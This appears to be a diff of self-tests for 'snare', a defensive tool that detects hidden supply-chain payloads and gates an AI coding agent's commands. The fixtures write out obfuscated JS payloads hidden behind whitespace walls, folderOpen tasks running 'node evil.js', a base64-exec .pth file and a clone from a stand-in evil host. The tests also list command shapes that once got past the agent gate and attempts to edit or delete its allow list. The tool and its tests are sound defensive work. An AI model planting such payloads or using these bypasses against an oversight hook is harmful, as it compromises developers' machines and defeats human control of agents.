@@ -88,7 +88,7 @@ src/generated/module-$i/index.ts"; done
   A="$(cd "$A" && pwd)"
   mkdir -p "$A/public/fonts"
   # A payload wearing an extension nothing globs, hidden past a tab wall.
-  python3 - "$A/public/fonts/fa-solid-300.llf" <<'PYX'
+  python3 -I - "$A/public/fonts/fa-solid-300.llf" <<'PYX'
 import sys
 open(sys.argv[1], "w").write("\t" * 2000 + "global['!']='8-J';eval(x);\n")
 PYX
@@ -263,7 +263,7 @@ _st_remediation(){
     git init -q . 2>/dev/null
     git config user.email selftest@snare.local 2>/dev/null
     git config user.name  "snare selftest"     2>/dev/null
-    python3 - <<'PY'
+    python3 -I - <<'PY'
 import os
 P = ('global.i = "A8-0000-0";global.r=require,"object"==typeof module&&(global.m=module);'
      'const http=require("node:http"),SENDER="0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a".toLowerCase(),'
@@ -303,7 +303,7 @@ PY
   _st_has   "$R/postcss.config.mjs" autoprefixer "build config keeps what the project needs"
   _st_kept  "$R/package.json"            "package.json survives remediation"
   _st_lacks "$R/package.json" blockscout "package.json no longer carries the payload"
-  if python3 -c 'import json,sys; json.load(open(sys.argv[1]))' "$R/package.json" 2>/dev/null; then
+  if python3 -I -c 'import json,sys; json.load(open(sys.argv[1]))' "$R/package.json" 2>/dev/null; then
     _st_ok  "package.json is still valid JSON afterwards"
   else
     _st_bad "package.json is still valid JSON afterwards"
@@ -340,7 +340,7 @@ _st_doctor(){
   printf '#!/bin/sh\nexit 0\n' > "$D/bad/bin/node";  chmod +x "$D/bad/bin/node"
   printf '#!/bin/sh\nexit 0\n' > "$D/good/bin/node"; chmod +x "$D/good/bin/node"
   # legit code, a long whitespace run, then the payload — the real signature
-  python3 - "$D/bad/lib/node_modules/npm/lib/cli.js" <<'PY'
+  python3 -I - "$D/bad/lib/node_modules/npm/lib/cli.js" <<'PY'
 import sys
 open(sys.argv[1], "w").write(
     "module.exports = (process) => validateEngines(process)" + " " * 200
@@ -388,7 +388,7 @@ _st_campaign(){
   #      no IOC string in any tracked file. Before this release the whole
   #      repository reported clean.
   mkdir -p "$D/bad/.claude" "$D/bad/.vscode"
-  python3 -c "open('$D/bad/api.js','w').write('var _0xaf=[];'+'x'*29000)"
+  python3 -I -c "open('$D/bad/api.js','w').write('var _0xaf=[];'+'x'*29000)"
   cat > "$D/bad/package.json" <<'JSON'
 { "name": "v", "scripts": { "dev": "node api.js && next dev" } }
 JSON
@@ -440,7 +440,7 @@ JSON
   #      for the word finds nothing. These three were measured as live
   #      bypasses before the verdict moved behind the parser.
   mkdir -p "$D/esc/.vscode" "$D/esc/.claude"
-  python3 - "$D/esc/.vscode/tasks.json" <<'PYX'
+  python3 -I - "$D/esc/.vscode/tasks.json" <<'PYX'
 import sys
 open(sys.argv[1], "w").write(
     '{ "version": "2.0.0", "tasks": [\n'
@@ -478,7 +478,7 @@ JSON
   # The same escape against the history cleaner, which had its own byte-level
   # pre-filter in front of the parse.
   cp "$D/esc/.vscode/tasks.json" "$D/esc/blob.json"
-  if python3 -c "$(_fix_strip_prog file)" "$D/esc/blob.json" 2>/dev/null \
+  if python3 -I -c "$(_fix_strip_prog file)" "$D/esc/blob.json" 2>/dev/null \
        | _qmatch -E 'STRIPPED|RESIDUE'; then
     _st_ok  "the history cleaner sanitises an escaped folderOpen task"
   else
@@ -488,7 +488,7 @@ JSON
   # The same trick one level up: the KEY escaped. A gate that tests for any
   # byte sequence a parser would resolve is the bug, not the particular word,
   # so the gate is shape only and this proves it.
-  python3 - "$D/esc/key.json" <<'PYX'
+  python3 -I - "$D/esc/key.json" <<'PYX'
 import sys
 # chr(92) so the file really gets a backslash, whatever quotes this passes
 # through on the way in.
@@ -498,7 +498,7 @@ open(sys.argv[1], "w").write(
     + '  { "label": "x", "command": "node evil.js",' + chr(10)
     + '    "runOptions": { "runOn": "folderOpen" } } ] }' + chr(10))
 PYX
-  if python3 -c "$(_fix_strip_prog file)" "$D/esc/key.json" 2>/dev/null \
+  if python3 -I -c "$(_fix_strip_prog file)" "$D/esc/key.json" 2>/dev/null \
        | _qmatch -E 'STRIPPED|RESIDUE'; then
     _st_ok  "an escaped \"tasks\" key does not get past the history cleaner"
   else
@@ -512,7 +512,7 @@ PYX
   # signature move.
   local enc envelope=0
   for enc in bom pad nl utf16 utf16be; do
-    python3 - "$D/esc/env.json" "$enc" <<'PYX'
+    python3 -I - "$D/esc/env.json" "$enc" <<'PYX'
 import sys
 body = ('{ "version": "2.0.0", "tasks": [ { "label": "x",'
         ' "command": "node evil.js",'
@@ -528,7 +528,7 @@ else:
     lead = {"bom": "﻿", "pad": " " * 2000, "nl": "\n" * 50}[enc]
     open(sys.argv[1], "w", encoding="utf-8").write(lead + body)
 PYX
-    python3 -c "$(_fix_strip_prog file)" "$D/esc/env.json" 2>/dev/null \
+    python3 -I -c "$(_fix_strip_prog file)" "$D/esc/env.json" 2>/dev/null \
       | _qmatch -E 'STRIPPED|RESIDUE' || envelope=1
   done
   if [ "$envelope" = 0 ]; then
@@ -543,7 +543,7 @@ PYX
            '{"compilerOptions":{"strict":true}}' \
            '{"version":"2.0.0","tasks":[{"label":"b","command":"npm run build"}]}'; do
     printf '%s\n' "$j" > "$D/esc/ctl.json"
-    python3 -c "$(_fix_strip_prog file)" "$D/esc/ctl.json" 2>/dev/null \
+    python3 -I -c "$(_fix_strip_prog file)" "$D/esc/ctl.json" 2>/dev/null \
       | _qmatch -E '^NONE$' || kept=1
   done
   if [ "$kept" = 0 ]; then
@@ -590,7 +590,7 @@ JSON
   #      live: 424 tabs followed by 28KB on one line, using none of the usual
   #      obfuscation markers — no _0x names, no \u escapes, no eval or atob,
   #      just long random identifiers and an array of hex strings.
-  python3 - "$D/wsfirst.js" <<'PYX'
+  python3 -I - "$D/wsfirst.js" <<'PYX'
 import sys
 body = ("function RvJq_qacMrKUHEOocOXlFJqDe(){var QyHKBnoNrhREfFAeW_tAK="
         "['4d4e494c4d4b382b05110e2e','4c4d4b4b47492b311b32250c','46494b483834370b1b30'];"
@@ -599,7 +599,7 @@ body = ("function RvJq_qacMrKUHEOocOXlFJqDe(){var QyHKBnoNrhREfFAeW_tAK="
 open(sys.argv[1], "w").write("\t" * 424 + body + chr(10))
 PYX
   local v
-  v="$(python3 -c "$(_fix_strip_prog file)" "$D/wsfirst.js" 2>/dev/null)"
+  v="$(python3 -I -c "$(_fix_strip_prog file)" "$D/wsfirst.js" 2>/dev/null)"
   case "$v" in
     EMPTY|STRIPPED) _st_ok  "a payload hidden behind a leading whitespace wall is removed" ;;
     *)              _st_bad "a payload hidden behind a leading whitespace wall is removed (got '${v:-nothing}')" ;;
@@ -607,14 +607,14 @@ PYX
 
   # The same obfuscation style WITHOUT the whitespace wall — an array of hex
   # strings is the signal, and it is one nothing honest writes.
-  python3 - "$D/hexarr.js" <<'PYX'
+  python3 -I - "$D/hexarr.js" <<'PYX'
 import sys
 open(sys.argv[1], "w").write(
     "const real = 1;" + " " * 80
     + "var a=['4d4e494c4d4b382b05110e2e','4c4d4b4b47492b311b32250c'];"
     + "var zz=1;" * 300 + "global['!']='8-4893-2';" + chr(10))
 PYX
-  v="$(python3 -c "$(_fix_strip_prog file)" "$D/hexarr.js" 2>/dev/null)"
+  v="$(python3 -I -c "$(_fix_strip_prog file)" "$D/hexarr.js" 2>/dev/null)"
   case "$v" in
     EMPTY|STRIPPED) _st_ok  "a hex-string table is recognised as obfuscation" ;;
     *)              _st_bad "a hex-string table is recognised as obfuscation (got '${v:-nothing}')" ;;
@@ -622,7 +622,7 @@ PYX
 
   # Controls: deep indentation and a tab-indented recipe are not payloads.
   printf '%s\n' "$(printf '\t%.0s' $(seq 1 60))echo hello" > "$D/tabs.mk"
-  v="$(python3 -c "$(_fix_strip_prog file)" "$D/tabs.mk" 2>/dev/null)"
+  v="$(python3 -I -c "$(_fix_strip_prog file)" "$D/tabs.mk" 2>/dev/null)"
   if [ "$v" = NONE ]; then
     _st_ok  "a tab-indented line with no payload is left alone"
   else
@@ -651,12 +651,12 @@ PYX
   ]
 }
 JSON
-  local v; v="$(python3 -c "$(_fix_tasks_prog)" "$D/jsonc/.vscode/tasks.json" 2>/dev/null)"
+  local v; v="$(python3 -I -c "$(_fix_tasks_prog)" "$D/jsonc/.vscode/tasks.json" 2>/dev/null)"
   case "${v%%	*}" in
     STRIPPED) _st_ok  "a JSONC tasks.json is cleaned, not deleted" ;;
     *)        _st_bad "a JSONC tasks.json is cleaned, not deleted (got '${v:-nothing}')" ;;
   esac
-  if python3 -c "
+  if python3 -I -c "
 import json,sys
 d=json.load(open(sys.argv[1]))
 sys.exit(0 if [t for t in d['tasks'] if t.get('label')=='build'] else 1)" \
@@ -754,10 +754,10 @@ _st_gate(){
 
   # ---- the classifier: quoted text is not a command
   local acts
-  acts="$(python3 -c "$(_gate_py)" "echo 'npm install' && printf '%s' \"git pull && npm ci\" && git log -1 --grep='npm run dev'" "$D" 2>/dev/null)"
+  acts="$(python3 -I -c "$(_gate_py)" "echo 'npm install' && printf '%s' \"git pull && npm ci\" && git log -1 --grep='npm run dev'" "$D" 2>/dev/null)"
   if [ -z "$acts" ]; then _st_ok "text that is only quoted — in echo, printf or a search pattern — is not gated"
   else _st_bad "text that is only quoted — in echo, printf or a search pattern — is not gated (got: $acts)"; fi
-  acts="$(python3 -c "$(_gate_py)" "cd app && npm --prefix web ci && git -C repo pull" "$D" 2>/dev/null)"
+  acts="$(python3 -I -c "$(_gate_py)" "cd app && npm --prefix web ci && git -C repo pull" "$D" 2>/dev/null)"
   if printf '%s' "$acts" | grep -q "tree	$D/app/web" && printf '%s' "$acts" | grep -q "pull	$D/app/repo"; then
     _st_ok "cd, --prefix and git -C are followed to the directory that actually runs"
   else _st_bad "cd, --prefix and git -C are followed (got: $acts)"; fi
@@ -777,7 +777,7 @@ _st_gate(){
   else _st_bad "a clean repository is let through (blocked: $out)"; fi
 
   ( cd "$D/seed" && printf '{"name":"x","scripts":{"dev":"node api.js && next dev"}}\n' > package.json
-    python3 -c "open('api.js','w').write('var _0xaf=[];'+'x'*29000)"
+    python3 -I -c "open('api.js','w').write('var _0xaf=[];'+'x'*29000)"
     git add -A && _stg commit -qm "chore: update" && git push -q "$D/remote.git" main ) >/dev/null 2>&1
 
   # ---- pull: fetched, scanned in a throwaway worktree, nothing merged
@@ -816,13 +816,13 @@ _st_gate(){
 
   # ---- the hook itself: exit 2 blocks and explains; anything else is free
   local hj
-  hj="$(python3 -c 'import json,sys;print(json.dumps({"tool_name":"Bash","cwd":sys.argv[1],"tool_input":{"command":sys.argv[2]}}))' \
+  hj="$(python3 -I -c 'import json,sys;print(json.dumps({"tool_name":"Bash","cwd":sys.argv[1],"tool_input":{"command":sys.argv[2]}}))' \
           "$D/seed" "npm run dev")"
   out="$(printf '%s' "$hj" | SNARE_HOME="$D/.snare" "$SNARE_ROOT/bin/snare" gate --hook 2>&1 >/dev/null)"; rc=$?
   if [ "$rc" = 2 ] && printf '%s' "$out" | _qmatch "FIRE ON THE MOUNTAIN"; then
     _st_ok "the Claude Code hook blocks with exit 2 and tells the agent why"
   else _st_bad "the Claude Code hook blocks with exit 2 and tells the agent why (rc=$rc)"; fi
-  hj="$(python3 -c 'import json,sys;print(json.dumps({"tool_name":"Bash","cwd":sys.argv[1],"tool_input":{"command":"ls -la && git status"}}))' "$D/seed")"
+  hj="$(python3 -I -c 'import json,sys;print(json.dumps({"tool_name":"Bash","cwd":sys.argv[1],"tool_input":{"command":"ls -la && git status"}}))' "$D/seed")"
   printf '%s' "$hj" | SNARE_HOME="$D/.snare" "$SNARE_ROOT/bin/snare" gate --hook >/dev/null 2>&1; rc=$?
   if [ "$rc" = 0 ]; then _st_ok "ordinary commands pass straight through the hook"
   else _st_bad "ordinary commands pass straight through the hook (rc=$rc)"; fi
@@ -834,7 +834,7 @@ _st_gate(){
   printf '# mine\n\nBe concise.\n' > "$H/.claude/CLAUDE.md"
   HOME="$H" SNARE_HOME="$D/.snare" "$SNARE_ROOT/bin/snare" agents install >/dev/null 2>&1
   HOME="$H" SNARE_HOME="$D/.snare" "$SNARE_ROOT/bin/snare" agents install >/dev/null 2>&1
-  if python3 -c "
+  if python3 -I -c "
 import json,sys; d=json.load(open(sys.argv[1]))
 assert d['model']=='opus' and len(d['hooks']['PostToolUse'])==1 and len(d['hooks']['PreToolUse'])==1" \
        "$H/.claude/settings.json" 2>/dev/null \
@@ -883,14 +883,14 @@ _st_gate_bypasses(){
   D="$(cd "$D" && pwd)"
   mkdir -p "$D/bad" "$D/ok"
   printf '{"name":"v","scripts":{"dev":"node api.js && next dev"}}\n' > "$D/bad/package.json"
-  python3 -c "open('$D/bad/api.js','w').write('var _0xaf=[];'+'x'*29000)"
+  python3 -I -c "open('$D/bad/api.js','w').write('var _0xaf=[];'+'x'*29000)"
   printf 'npm install\n' > "$D/bad/setup.sh"; chmod +x "$D/bad/setup.sh"
   printf '{"name":"ok","scripts":{"dev":"next dev"}}\n' > "$D/ok/package.json"
   local r; for r in bad ok; do
     ( cd "$D/$r" && git init -q && git add -A && git -c user.email=t@t -c user.name=t commit -qm i ) >/dev/null 2>&1
   done
   local c rc missed="" n=0
-  _stj(){ python3 -c 'import json,sys;print(json.dumps({"tool_name":"Bash","cwd":sys.argv[1],"tool_input":{"command":sys.argv[2]}}))' "$1" "$2"; }
+  _stj(){ python3 -I -c 'import json,sys;print(json.dumps({"tool_name":"Bash","cwd":sys.argv[1],"tool_input":{"command":sys.argv[2]}}))' "$1" "$2"; }
   _sth(){ _stj "$1" "$2" | SNARE_NO_NOTIFY=1 SNARE_HOME="$D/.snare" "$SNARE_ROOT/bin/snare" gate --hook >/dev/null 2>&1; }
   # Every one of these ran npm (or the repo's own code) in an infected
   # repository and was ALLOWED by an earlier version of the gate. They are the
@@ -935,7 +935,7 @@ code .
 git commit -m x
 find . -name x -exec npm install \;
 awk 'BEGIN{system("npm install")}'
-python3 -c "\nimport os\nos.system('npm install')\n"
+python3 -I -c "\nimport os\nos.system('npm install')\n"
 git \\\nclone https://github.com/a/b.git
 CMDS
   if [ -z "$missed" ]; then
@@ -946,7 +946,7 @@ CMDS
 
   # The other half: a clean repository is never blocked, whatever the shape.
   missed=""
-  for c in "npm install" "eslint ." "make" "git commit -m x" "$(printf 'python3 -c "\nprint(1)\n"')"; do
+  for c in "npm install" "eslint ." "make" "git commit -m x" "$(printf 'python3 -I -c "\nprint(1)\n"')"; do
     _sth "$D/ok" "$c" || missed="$missed [$c]"
   done
   if [ -z "$missed" ]; then _st_ok "a clean repository is never blocked, whatever the command"
@@ -967,7 +967,7 @@ CMDS
 
   # gh brings code in too, and the gate has to see it.
   local acts
-  acts="$(python3 -c "$(_gate_py)" "gh pr checkout 45 && gh repo clone a/b" "$D" 2>/dev/null)"
+  acts="$(python3 -I -c "$(_gate_py)" "gh pr checkout 45 && gh repo clone a/b" "$D" 2>/dev/null)"
   if printf '%s' "$acts" | grep -q "pull	$D	origin	pull/45/head" \
      && printf '%s' "$acts" | grep -q "clone	$D	https://github.com/a/b.git"; then
     _st_ok "gh pr checkout and gh repo clone are gated like git"
@@ -1003,7 +1003,7 @@ _st_gate_decide(){
   local _h="$SNARE_HOME" _a="$GATE_ALLOW" _c="$GATE_CACHE" _l="$SNARE_LOGS" _g="$GATE_LOG"
   SNARE_HOME="$D/.snare"; GATE_ALLOW="$SNARE_HOME/gate-allow"; GATE_CACHE="$SNARE_HOME/gate-cache"
   SNARE_LOGS="$SNARE_HOME/logs"; GATE_LOG="$SNARE_LOGS/gate.log"; GATE_PENDING="$SNARE_LOGS/gate-pending"
-  _stj(){ python3 -c 'import json,sys;print(json.dumps({"tool_name":"Bash","cwd":sys.argv[1],"tool_input":{"command":sys.argv[2]}}))' "$1" "$2"; }
+  _stj(){ python3 -I -c 'import json,sys;print(json.dumps({"tool_name":"Bash","cwd":sys.argv[1],"tool_input":{"command":sys.argv[2]}}))' "$1" "$2"; }
   # stderr is what the agent is shown; stdout is discarded.
   _sth(){ { _stj "$1" "$2" | SNARE_HOME="$D/.snare" "$SNARE_ROOT/bin/snare" gate --hook >/dev/null; } 2>&1; }
   _sti(){ ( cd "$1" && git init -q && git add -A && git -c user.email=t@t -c user.name=t commit -qm i ) >/dev/null 2>&1; }
@@ -1025,7 +1025,7 @@ _st_gate_decide(){
   # ---- the block says where, what, and gives the person both choices
   mkdir -p "$D/bad"
   printf '{"name":"v","scripts":{"dev":"node api.js && next dev"}}\n' > "$D/bad/package.json"
-  python3 -c "open('$D/bad/api.js','w').write('var _0xaf=[];'+'x'*29000)"; _sti "$D/bad"
+  python3 -I -c "open('$D/bad/api.js','w').write('var _0xaf=[];'+'x'*29000)"; _sti "$D/bad"
   out="$(_sth "$D/bad" "npm run dev")"; rc=$?
   if [ "$rc" = 2 ] && printf '%s' "$out" | _qmatch 'package.json:1 — "dev" runs api.js' \
      && printf '%s' "$out" | _qmatch 'snare gate allow' && printf '%s' "$out" | _qmatch 'snare respond'; then
@@ -1046,13 +1046,13 @@ _st_gate_decide(){
 
   # ---- a person's approval is honoured, and is tied to the file's content
   local lit p w fp; lit="$(mktemp "${TMPDIR:-/tmp}/snareioc.XXXXXX")"; ioc_literals > "$lit"
-  python3 -c "$(_gate_routes_py)" "$D/bad" "$lit" "$(ioc_regexes)" /dev/null /dev/null x 1 "$SNARE_ROOT" 2>/dev/null \
+  python3 -I -c "$(_gate_routes_py)" "$D/bad" "$lit" "$(ioc_regexes)" /dev/null /dev/null x 1 "$SNARE_ROOT" 2>/dev/null \
     | while IFS="$(printf '\t')" read -r p _ w _ fp; do _gate_allow_record "$fp" "$D/bad" "$p" "$w"; done
   rm -f "$lit"
   _sth "$D/bad" "npm run dev" >/dev/null; rc=$?
   if [ "$rc" = 0 ]; then _st_ok "once a person allows a finding, the command runs"
   else _st_bad "once a person allows a finding, the command runs (rc=$rc)"; fi
-  python3 -c "open('$D/bad/api.js','a').write('var y=1;')"
+  python3 -I -c "open('$D/bad/api.js','a').write('var y=1;')"
   _sth "$D/bad" "npm run dev" >/dev/null; rc=$?
   if [ "$rc" = 2 ]; then _st_ok "and if the file changes afterwards, it is flagged again"
   else _st_bad "and if the file changes afterwards, it is flagged again (rc=$rc)"; fi
@@ -1075,7 +1075,7 @@ _st_gate_round5(){
   local D; D="$(mktemp -d "${TMPDIR:-/tmp}/snareg5.XXXXXX")" || return 0
   D="$(cd "$D" && pwd)"
   local SNARE_NO_NOTIFY=1; export SNARE_NO_NOTIFY
-  _stj(){ python3 -c 'import json,sys;print(json.dumps({"tool_name":"Bash","cwd":sys.argv[1],"tool_input":{"command":sys.argv[2]}}))' "$1" "$2"; }
+  _stj(){ python3 -I -c 'import json,sys;print(json.dumps({"tool_name":"Bash","cwd":sys.argv[1],"tool_input":{"command":sys.argv[2]}}))' "$1" "$2"; }
   _sth(){ _stj "$1" "$2" | SNARE_HOME="$D/.snare" "$SNARE_ROOT/bin/snare" gate --hook >/dev/null 2>&1; }
 
   # A directory that arrives with its own .git/config — an archive, a copied
@@ -1090,7 +1090,7 @@ _st_gate_round5(){
 
   # A payload imported by the app is not on a "route" — the source pass sees it.
   mkdir -p "$D/src/src/lib" && ( cd "$D/src" && printf '{"name":"s","scripts":{"dev":"next dev"}}\n' > package.json
-    python3 -c "open('src/lib/util.js','w').write('export const a=1;'+' '*300+'var _0xab12=[1];eval(atob(\"eA==\"));\n')"
+    python3 -I -c "open('src/lib/util.js','w').write('export const a=1;'+' '*300+'var _0xab12=[1];eval(atob(\"eA==\"));\n')"
     git init -q && git add -A && git -c user.email=t@t -c user.name=t commit -qm i ) >/dev/null 2>&1
   _sth "$D/src" "npm run dev"
   if [ $? = 2 ]; then _st_ok "a payload hidden in an ordinary source file is found, not only in configs"
@@ -1112,12 +1112,12 @@ _st_gate_round6(){
   local D; D="$(mktemp -d "${TMPDIR:-/tmp}/snareg6.XXXXXX")" || return 0
   D="$(cd "$D" && pwd)"
   local SNARE_NO_NOTIFY=1; export SNARE_NO_NOTIFY
-  _stj(){ python3 -c 'import json,sys;print(json.dumps({"tool_name":"Bash","cwd":sys.argv[1],"tool_input":{"command":sys.argv[2]}}))' "$1" "$2"; }
+  _stj(){ python3 -I -c 'import json,sys;print(json.dumps({"tool_name":"Bash","cwd":sys.argv[1],"tool_input":{"command":sys.argv[2]}}))' "$1" "$2"; }
   _sth(){ _stj "$1" "$2" | SNARE_HOME="$D/.snare" "$SNARE_ROOT/bin/snare" gate --hook >/dev/null 2>&1; }
   _sti(){ ( cd "$1" && git init -q && git add -A && git -c user.email=t@t -c user.name=t commit -qm i ) >/dev/null 2>&1; }
   mkdir -p "$D/bad"
   printf '{"name":"v","scripts":{"dev":"node api.js && next dev"}}\n' > "$D/bad/package.json"
-  python3 -c "open('$D/bad/api.js','w').write('var _0xaf=[];'+'x'*29000)"
+  python3 -I -c "open('$D/bad/api.js','w').write('var _0xaf=[];'+'x'*29000)"
   : > "$D/bad/.snare-tool"; _sti "$D/bad"
   _sth "$D/bad" "npm run dev"
   if [ $? = 2 ]; then _st_ok "a repository that ships a .snare-tool marker is not exempted"
@@ -1127,14 +1127,14 @@ _st_gate_round6(){
   mkdir -p "$D/src/lib"; printf '{"name":"s","scripts":{"dev":"next dev"}}\n' > "$D/src/package.json"
   printf 'export const a = 1;\n' > "$D/src/lib/u.js"; _sti "$D/src"
   _sth "$D/src" "npm run dev"
-  python3 -c "open('$D/src/lib/u.js','w').write('export const a=1;'+' '*300+'var _0xab12=[1];eval(atob(\"eA==\"));\n')"
+  python3 -I -c "open('$D/src/lib/u.js','w').write('export const a=1;'+' '*300+'var _0xab12=[1];eval(atob(\"eA==\"));\n')"
   _sth "$D/src" "npm run dev"
   if [ $? = 2 ]; then _st_ok "a cached clean verdict lapses when a source file changes"
   else _st_bad "a cached clean verdict lapses when a source file changes"; fi
 
   local c miss=""
   for c in "$(printf 'n\\\npm install')" "echo x>$D/.snare/gate-allow" \
-           "python3 -c \"open('$D/.snare/gate-allow','a').write('x')\"" "rm -rf $D/.snare"; do
+           "python3 -I -c \"open('$D/.snare/gate-allow','a').write('x')\"" "rm -rf $D/.snare"; do
     _sth "$D/bad" "$c"; [ $? = 2 ] || miss="$miss [$(printf '%s' "$c" | tr '\n' ' ')]"
   done
   # The other direction: a script that only SOURCES a library which writes
@@ -1184,9 +1184,9 @@ _st_respond(){
 
   # the gate records what it stopped; respond shows it and acts on the choice
   mkdir -p "$D/a"; printf '{"name":"a","scripts":{"dev":"next dev"}}\n' > "$D/a/package.json"
-  python3 -c "import sys; open(sys.argv[1],'w').write('export default {};' + ' '*200 + 'global[\"_V\"]=\"8-q4FZkxX\"\\n')" "$D/a/postcss.config.mjs"
+  python3 -I -c "import sys; open(sys.argv[1],'w').write('export default {};' + ' '*200 + 'global[\"_V\"]=\"8-q4FZkxX\"\\n')" "$D/a/postcss.config.mjs"
   mkdir -p "$D/b"; printf '{"name":"b","scripts":{"dev":"node api.js && next dev"}}\n' > "$D/b/package.json"
-  python3 -c "open('$D/b/api.js','w').write('var _0xaf=[];'+'x'*29000)"
+  python3 -I -c "open('$D/b/api.js','w').write('var _0xaf=[];'+'x'*29000)"
   local r; for r in a b; do ( cd "$D/$r" && git init -q && git add -A && git -c user.email=t@t -c user.name=t commit -qm i ) >/dev/null 2>&1; done
   _gate_decide "npm run dev" "$D/a" >/dev/null; _gate_decide "npm run dev" "$D/b" >/dev/null
   if [ "$(grep -c "^local" "$GATE_PENDING" 2>/dev/null)" = 2 ]; then
@@ -1203,15 +1203,15 @@ _st_respond(){
   # a library a script sources runs its top-level lines — they are checked
   mkdir -p "$D/src"; printf 'git clone https://example.invalid/evil.git x\ncd x && npm install\n' > "$D/src/lib.sh"
   printf '. ./lib.sh\n' > "$D/src/run.sh"
-  out="$(python3 -c "$(_gate_py)" "bash run.sh" "$D/src" "$SNARE_ROOT" | cut -f1 | tr '\n' ' ')"
+  out="$(python3 -I -c "$(_gate_py)" "bash run.sh" "$D/src" "$SNARE_ROOT" | cut -f1 | tr '\n' ' ')"
   case "$out" in
     *clone*tree*) _st_ok "a clone and install inside a sourced library are checked, not dropped" ;;
     *) _st_bad "a clone and install inside a sourced library are checked, not dropped ($out)" ;;
   esac
 
   # an agent does not get to drive it
-  out="$(python3 -c "$(_gate_py)" "snare respond" "$D" "$SNARE_ROOT")"
-  if printf '%s' "$out" | _qmatch "refuse" && [ -z "$(python3 -c "$(_gate_py)" "snare respond --status" "$D" "$SNARE_ROOT")" ]; then
+  out="$(python3 -I -c "$(_gate_py)" "snare respond" "$D" "$SNARE_ROOT")"
+  if printf '%s' "$out" | _qmatch "refuse" && [ -z "$(python3 -I -c "$(_gate_py)" "snare respond --status" "$D" "$SNARE_ROOT")" ]; then
     _st_ok "an agent is refused 'snare respond' but may read its --status"
   else _st_bad "an agent is refused 'snare respond' but may read its --status"; fi
 
@@ -1327,7 +1327,7 @@ _st_allow_incoming(){
   ( cd "$D/seed" && "${G[@]}" add -A && "${G[@]}" commit -qm clean && "${G[@]}" push -q origin main ) >/dev/null 2>&1
   "${G[@]}" clone -q "$D/up.git" "$D/work" 2>/dev/null
   ( cd "$D/work" && "${G[@]}" switch -q -c feat && "${G[@]}" branch -q -D main ) >/dev/null 2>&1
-  python3 -c "import sys; open(sys.argv[1],'w').write('module.exports = {};' + ' '*200 + 'global[\"_V\"]=\"8-q4FZkxX\"\n')" "$D/seed/postcss.config.js"
+  python3 -I -c "import sys; open(sys.argv[1],'w').write('module.exports = {};' + ' '*200 + 'global[\"_V\"]=\"8-q4FZkxX\"\n')" "$D/seed/postcss.config.js"
   ( cd "$D/seed" && "${G[@]}" add -A && "${G[@]}" commit -qm demo && "${G[@]}" push -q origin main ) >/dev/null 2>&1
   ( cd "$D/work" && "${G[@]}" fetch -q ) >/dev/null 2>&1
 
@@ -1386,7 +1386,7 @@ _st_deps(){
   _sdm Go go github.com/evil/mod '["v1.0.1"]' MAL-6
   printf '{"id":"MAL-8","withdrawn":"2026-01-01","affected":[{"package":{"ecosystem":"npm","name":"retracted"},"versions":["1.0.0"]}]}\n' > "$D/mp/osv/malicious/npm/MAL-8.json"
   python3 "$SNARE_ROOT/scripts/build-intel.py" "$D/mp" "$D/pub" >/dev/null 2>&1
-  local n; n="$(python3 -c 'import json,sys;print(json.load(open(sys.argv[1]))["entries"])' "$D/pub/intel.json" 2>/dev/null)"
+  local n; n="$(python3 -I -c 'import json,sys;print(json.load(open(sys.argv[1]))["entries"])' "$D/pub/intel.json" 2>/dev/null)"
   if [ "$n" = 5 ]; then _st_ok "the list builder condenses OSV records and drops withdrawn ones"
   else _st_bad "the list builder condenses OSV records and drops withdrawn ones (entries=$n)"; fi
 
@@ -1449,10 +1449,10 @@ CMDS
   _gate_decide "npm i ua-hijack@latest" "$D" >/dev/null 2>&1 || rr="$rr | (latest=0.7.30 wrongly stopped)"
   unset -f _deps_resolve_latest; . "$SNARE_ROOT/lib/deps.sh"
   INTEL_DIR="$SNARE_HOME/intel"; INTEL_LIST="$INTEL_DIR/malicious.tsv.gz"; INTEL_META="$INTEL_DIR/intel.json"
-  [ "$(python3 -S -c "$(_deps_py)" pick - ">=1.100,<1.107.1" 1.106.0 1.107.0 1.108.0 1.107.1rc1)" = 1.107.0 ] || rr="$rr | pick"
+  [ "$(python3 -I -S -c "$(_deps_py)" pick - ">=1.100,<1.107.1" 1.106.0 1.107.0 1.108.0 1.107.1rc1)" = 1.107.0 ] || rr="$rr | pick"
   mkdir -p "$D/sp/.venv/lib/python3.12/site-packages"; printf 'home=/usr\n' > "$D/sp/.venv/pyvenv.cfg"
   printf 'import os, base64; exec(base64.b64decode("eA=="))\n' > "$D/sp/.venv/lib/python3.12/site-packages/cook.pth"
-  local k v w; IFS="$(printf '\t')" read -r k _ _ v w _ < <(python3 -S -c "$(_deps_py)" scan "$INTEL_LIST" "$D/sp" --installed)
+  local k v w; IFS="$(printf '\t')" read -r k _ _ v w _ < <(python3 -I -S -c "$(_deps_py)" scan "$INTEL_LIST" "$D/sp" --installed)
   [ "$k" = startup ] && [ -f "${w%:*}" ] || rr="$rr | startup columns ($w)"
   # quarantine moves a package's files out without starting its environment
   local sp2="$D/qv/.venv/lib/python3.12/site-packages"; mkdir -p "$sp2/litellm-1.107.0.dist-info" "$sp2/litellm" "$D/qv/.venv/bin"
@@ -1461,7 +1461,7 @@ CMDS
   printf 'Name: litellm\nVersion: 1.107.0\n' > "$sp2/litellm-1.107.0.dist-info/METADATA"
   printf 'litellm/__init__.py,,\ncook.pth,,\n../../../../outside.txt,,\nlitellm-1.107.0.dist-info/METADATA,,\n' > "$sp2/litellm-1.107.0.dist-info/RECORD"
   printf 'keep\n' > "$D/qv/outside.txt"
-  python3 -S -c "$(_deps_py)" quarantine - "$sp2" litellm 1.107.0 "$D/quar" >/dev/null 2>&1
+  python3 -I -S -c "$(_deps_py)" quarantine - "$sp2" litellm 1.107.0 "$D/quar" >/dev/null 2>&1
   [ ! -e "$sp2/cook.pth" ] && [ ! -e "$sp2/litellm" ] && [ -f "$D/quar/cook.pth" ] && [ -f "$D/qv/outside.txt" ] \
     && [ ! -e "$D/ENV-PYTHON-RAN" ] || rr="$rr | quarantine"
   _deps_resolve_latest(){ :; }
@@ -1470,6 +1470,23 @@ CMDS
   INTEL_DIR="$SNARE_HOME/intel"; INTEL_LIST="$INTEL_DIR/malicious.tsv.gz"; INTEL_META="$INTEL_DIR/intel.json"
   [ -z "$rr" ] && _st_ok "ranges, tags, aliases, tools by path, launchers and -rfile are all checked; columns hold" \
               || _st_bad "ranges, tags, aliases, tools by path, launchers and -rfile are all checked —$rr"
+
+  # a repository cannot run code through snare's own Python imports: snare
